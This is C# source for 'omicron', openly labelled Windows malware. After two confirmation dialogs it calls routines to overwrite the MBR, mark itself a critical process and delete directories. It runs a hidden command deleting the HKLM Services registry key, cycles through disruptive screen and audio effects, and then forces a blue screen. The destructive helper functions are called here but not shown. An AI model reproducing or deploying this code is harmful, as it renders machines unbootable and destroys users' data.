using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.Remoting.Messaging;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace omicron
{
    class main
    {
        [STAThread]
        static void Main(string[] args)
        {
            if (File.Exists("C:\\block_omicron.txt"))
            {
                MessageBox.Show("Execution blocked by file! Omicron will not continue.", "omicron.exe",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            } 
            else
            {
                Console.WriteLine("lol");

                if (MessageBox.Show(
                    "WARNING!\n\n" +
                    "You are about to run a malware.\n" +
                    "This malware has full capacity to make Windows unbootable!\n" +
                    "Running this malware will also result in DATA LOSS!\n" +
                    "Are you sure you still want to run this?",

                    "omicron - Malware Alert", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2
                ) == DialogResult.Yes)
                {
                    if (MessageBox.Show(
                        "FINAL WARNING!!!\n\n" +
                        "This is the last chance to prevent this program from execution!\n" +
                        "This program should be ran in a safe environment like a virtual machine!\n" +
                        "The creator of this malware, Silverjetes, is not responsible for any damage made!\n" +
                        "Are you ABSOLUTELY sure you want to run this?",

                        "(FINAL WARNING) omicron - Malware Alert", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2
                    ) == DialogResult.Yes)
                    {
                        destruction.KillMBR();
                        destruction.SetAsCritical();
                        destruction.directoryDeletion();

                        // proest code
                        ProcessStartInfo psi = new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = "/c reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services /f",
                            UseShellExecute = true,
                            WindowStyle = ProcessWindowStyle.Hidden
                        };

                        Process.Start(psi);

                        Thread.Sleep(500);
                        new Thread(spawnBox).Start();
                        Thread.Sleep(3000);
                        new Thread(Threads).Start();
                    }
                    else
                    {
                        Environment.Exit(0);
                    }
                }
                else
                {
                    Environment.Exit(0);
                }
                void spawnBox()
                {
                    Application.Run(new messageBox());
                }
            }
        }

        static void Threads()
        {
            // horrible threading system

            Thread icon = new Thread(gdi.iconpayload);
            Thread window = new Thread(gdi.windowMess);
            Thread bytebeat = new Thread(bytebeats.player);

            window.Start();
            bytebeat.Start();

            new Thread(payloads.changeWindowText).Start();
            new Thread(payloads.mousehell).Start();

            Thread.Sleep(10000);

            new Thread(gdi.invertForegroundWindow).Start();

            Thread.Sleep(5000);

            icon.Start();

            Thread.Sleep(15000);

            gdi.clear();

            Thread p2_1 = new Thread(gdi.blur);
            Thread p2_2 = new Thread(gdi.glitches);
            Thread p2_3 = new Thread(gdi.clearloop);

            window.Abort();
            p2_1.Start();
            p2_2.Start();
            p2_3.Start();

            Thread.Sleep(30000);

            p2_1.Abort();
            p2_2.Abort();
            p2_3.Abort();

            gdi.clear();

            Thread p3_1 = new Thread(gdi.shake);
            Thread p3_2 = new Thread(gdi.hatchbrush);
            Thread p3_3 = new Thread(gdi.squares);
            Thread p3_4 = new Thread(gdi.cursorDrawer);
            Thread p3_5 = new Thread(gdi.clearloop1);

            p3_1.Start();
            p3_2.Start();
            p3_3.Start();
            p3_4.Start();
            p3_5.Start();

            Thread.Sleep(30000);

            icon.Abort();
            p3_1.Abort();
            p3_2.Abort();
            p3_3.Abort();
            p3_4.Abort();
            p3_5.Abort();

            gdi.clear();

            Thread p4_1 = new Thread(gdi.scrolling);
            Thread p4_2 = new Thread(gdi.invertColours);

            p4_1.Start();
            p4_2.Start();

            Thread.Sleep(30000);

            p4_1.Abort();
            p4_2.Abort();

            gdi.clear();

            Thread p5_1 = new Thread(gdi.icondvdlogo);
            Thread p5_2 = new Thread(gdi.hatchbrush1);

            p5_1.Start();
            p5_2.Start();

            Thread.Sleep(30000);

            p5_1.Abort();
            p5_2.Abort();

            gdi.clear();

            Thread p6_1 = new Thread(gdi.text);
            Thread p6_2 = new Thread(gdi.paintcolors);

            p6_1.Start();
            p6_2.Start();

            Thread.Sleep(30000);

            p6_1.Abort();
            p6_2.Abort();

            gdi.clear();

            Thread p7_1 = new Thread(gdi.colorfrying);
            Thread p7_2 = new Thread(gdi.ellipse);
            Thread p7_3 = new Thread(gdi.melting);

            p7_1.Start();
            p7_2.Start();
            p7_3.Start();

            Thread.Sleep(30000);

            p7_1.Abort();
            p7_2.Abort();
            p7_3.Abort();

            gdi.clear();

            Thread p8_1a = new Thread(gdi.invert);
            Thread p8_1b = new Thread(gdi.invertHB);
            Thread p8_2 = new Thread(gdi.drawIconsAndCursors);
            Thread p8_3 = new Thread(gdi.mess);
            Thread p8_4 = new Thread(gdi.shake1);

            p8_1a.Start();
            p8_2.Start();
            p8_3.Start();

            Thread.Sleep(30000);

            p8_1a.Abort();
            p8_2.Abort();
            p8_3.Abort();

            p8_1b.Start();
            p8_4.Start();

            Thread.Sleep(30000);
            destruction.BSoD();
            Environment.Exit(0);
        }
    }
}